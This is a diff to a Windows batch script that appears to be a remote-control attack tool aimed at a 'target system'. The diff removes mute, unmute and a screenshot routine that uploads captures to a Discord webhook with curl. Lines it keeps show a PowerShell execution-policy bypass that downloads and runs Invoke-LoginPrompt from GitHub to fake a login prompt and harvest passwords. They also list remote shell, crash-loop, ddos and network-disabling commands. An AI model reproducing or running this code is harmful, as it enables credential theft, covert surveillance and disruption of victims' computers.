@@ -24,16 +24,6 @@ echo.
 goto main
 )
 
-if /I "%input%" EQU "mute" (
-nircmd.exe mutesysvolume 1
-goto main
-)
-
-if /I "%input%" EQU "unmute" (
-nircmd.exe mutesysvolume 0
-goto main
-)
-
 if /I "%input%" EQU "monitor" (
 nircmd.exe monitor off
 goto main
@@ -55,10 +45,6 @@ goto main
 if /I "%input%" EQU "disconnect" (
 netsh wlan disconnect
 goto main
-)
-
-if /I "%input%" EQU "screenshot" (
-goto screenshot
 )
 
 if /I "%input%" EQU "ddos" (
@@ -237,7 +223,6 @@ echo --------------------
 echo.
 echo getinfo - Lists information about target system
 echo geolocate - locates geolocation of target system
-echo screenshot - captures target systems screen (Requires Webhook)
 echo.
 echo ---------------------
 echo   Password Commands
@@ -253,7 +238,6 @@ echo.
 echo shutdown - Shutdowns down target system
 echo message - Send messagebox to target system
 echo website - Open specified website on target system
-echo monitor - Turns off the monitor
 echo crash - Loops cmd.exe opening until system crash
 echo disconnect - Disconnects from current wifi
 echo adapter - Disables network adapter
@@ -265,8 +249,6 @@ echo.
 echo admincheck - Check for Administrator priviledges
 echo shell - Remote shell 
 echo ps - Remote powershell
-echo mute - Mutes the system volume
-echo unmute - Unmutes the system volume
 echo.
 goto main
 
@@ -284,19 +266,6 @@ exit
 echo Waiting...
 powershell.exe -ep bypass -c IEX ((New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/enigma0x3/Invoke-LoginPrompt/master/Invoke-LoginPrompt.ps1’)); Invoke-LoginPrompt
 echo.
-goto main
-
-exit
-
-:screenshot
-echo.
-set /p webhook=Enter your discord webhook: 
-nircmd savescreenshot "%temp%\vcapture.jpg"
-cd %temp%
-curl -s -F "file1=@vcapture.jpg" \ %webhook%
-ping locahost -n 5 >nul
-echo.
-del vcapture.jpg
 goto main
 
 exit
